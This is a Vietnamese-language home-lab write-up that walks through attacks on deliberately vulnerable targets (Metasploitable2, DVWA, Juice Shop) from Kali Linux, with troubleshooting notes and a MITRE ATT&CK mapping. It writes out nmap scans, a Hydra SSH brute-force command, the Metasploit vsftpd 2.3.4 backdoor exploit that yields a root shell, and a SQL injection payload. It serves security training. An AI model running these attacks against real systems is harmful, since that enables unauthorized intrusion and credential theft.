# Module 3: Kali Linux + Metasploitable2 

## Mục tiêu

Dựng máy tấn công (Kali Linux) và các mục tiêu dễ tổn thương (Metasploitable2, DVWA, Juice Shop) mô phỏng một chuỗi tấn công thực tế: network reconnaissance → service exploitation → credential brute-force → web application exploitation.

## Kiến trúc

| Máy | Vai trò | IP (VMnet2) |
| Kali Linux | Attacker | 10.2.66.135 |
| Metasploitable2 | Target — network/service vulnerabilities | 10.2.66.136 |
| Kali (Docker) | Target — web application vulnerabilities (DVWA, Juice Shop) | localhost (trên chính Kali) |

## 1. Web application targets: DVWA + Juice Shop

DVWA và Juice Shop được chạy dưới dạng container Docker ngay trên Kali:

```bash
sudo docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa
sudo docker run -d --name juiceshop -p 3000:3000 bkimminich/juice-shop
```

Truy cập qua trình duyệt trên Kali:
- DVWA: `http://localhost:8080`
- Juice Shop: `http://localhost:3000`

![DVWA giao diện chính](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/DVWA%20web.png)
![Juice Shop giao diện chính](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/Juice%20shop.png)

## 2. Network Reconnaissance

Quét toàn bộ subnet lab để xác định các host đang hoạt động:

```bash
sudo nmap -sn 10.2.66.0/24
```

![Kết quả quét subnet](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/nmap%20ki%E1%BB%83m%20tra%20m%C3%A1y%20alive.png)

Sau khi xác định Metasploitable2 ở `10.2.66.136`, tiến hành quét sâu để liệt kê service và version:

```bash
sudo nmap -sV -A 10.2.66.136
```

Kết quả cho thấy Metasploitable2 mở gần 20 service, trong đó đáng chú ý nhất:

| Port | Service | Ghi chú |
|---|---|---|
| 21 | vsftpd 2.3.4 | Có backdoor đã biết (CVE-2011-2523), cho phép anonymous login |
| 22 | OpenSSH 4.7p1 | Phiên bản cũ, phù hợp để test brute-force |
| 1524 | bindshell | Dấu vết backdoor vsftpd đã từng được kích hoạt sẵn trên image |
| 3306 | MySQL 5.0.51a | |
| 6667 | UnrealIRCd | Cũng có backdoor đã biết |

![Kết quả quét chi tiết Metasploitable2](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/D%C3%99ng%20kali%20qu%C3%A9t%20ip%20c%E1%BB%A7a%20metasploitable2.png)

## 3. Credential Brute-Force — Hydra

Thử brute-force SSH bằng wordlist tùy chỉnh:

```bash
hydra -l msfadmin -P /tmp/small_wordlist.txt ssh://10.2.66.136
```

**Vấn đề gặp phải:** lần chạy đầu tiên thất bại với lỗi `kex error: no match for method mac algo` — do OpenSSH 4.7p1 (2008) trên Metasploitable2 chỉ hỗ trợ các thuật toán mã hóa cũ (MD5, SHA1), trong khi Kali hiện đại mặc định tắt các thuật toán này vì lý do bảo mật.

**Giải pháp:** cấu hình `~/.ssh/config` (hoặc `/etc/ssh/ssh_config`) cho phép lại thuật toán legacy khi kết nối tới host này:

```
Host 10.2.66.136
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa
    MACs +hmac-md5,hmac-sha1
```

Sau khi sửa, Hydra brute-force thành công, tìm ra đúng mật khẩu:

![Hydra brute-force thành công](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/%C4%91%C3%A3%20l%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20m%E1%BA%ADt%20kh%E1%BA%A9u%20c%E1%BB%A7a%20metasploitable2.png)

## 4. Exploitation — vsftpd 2.3.4 Backdoor (Remote Code Execution)

Khai thác trực tiếp lỗ hổng backdoor bằng Metasploit Framework:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.2.66.136
set LHOST 10.2.66.135
run
```

**Vấn đề gặp phải:** exploit thất bại lần đầu do payload cố mở HTTP fetch server trên cổng `8080` — trùng với cổng DVWA đang chạy trên Kali. Giải pháp: đổi `FETCH_SRVPORT` sang `8081`.

Sau khi khắc phục, exploit thành công, thu được Meterpreter session với quyền root:

![Metasploit thiết lập backdoor](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/setup%20backdoor%20cho%20metasploitable.png)
![Meterpreter session - quyền root](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/T%E1%BA%A1o%20backdoor.png)

## 5. Web Exploitation — SQL Injection trên DVWA

Với DVWA Security level đặt ở **Low**, thực hiện UNION-based SQL Injection tại module SQL Injection:

```sql
1' UNION SELECT database(), version()#
```

Kết quả trả về tên database (`dvwa`) và phiên bản MariaDB đang chạy — chứng minh khả năng đọc dữ liệu hệ thống thông qua 1 form vốn chỉ để tra cứu user theo ID.

![SQL Injection thành công trên DVWA](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/SQLi%20tr%C3%AAn%20DVWA1.png)

![SQL Injection thành công trên DVWA](https://github.com/SangTrank5/SOC-home-lab/blob/main/screenshots/Kali%2Bmetasploitable2/SQLi%20tr%C3%AAn%20DVWA2.png)

## Bảng tổng hợp vấn đề gặp phải

| Vấn đề | Nguyên nhân | Giải pháp |
|---|---|---|
| Hydra báo lỗi `kex error` khi brute-force SSH | OpenSSH 4.7p1 (2008) chỉ hỗ trợ thuật toán mã hóa cũ, Kali hiện đại mặc định tắt | Thêm `KexAlgorithms`, `HostKeyAlgorithms`, `MACs` legacy vào SSH config |
| Metasploit exploit vsftpd thất bại: `Fetch handler failed to start on :8080` | Cổng 8080 bị chiếm bởi container DVWA đang chạy trên Kali | Đổi `FETCH_SRVPORT` sang cổng khác (8081) |

## MITRE ATT&CK liên quan

| Technique | Tactic |
|---|---|
| T1046 — Network Service Discovery | Discovery |
| T1190 — Exploit Public-Facing Application | Initial Access |
| T1110.001 — Brute Force: Password Guessing | Credential Access |

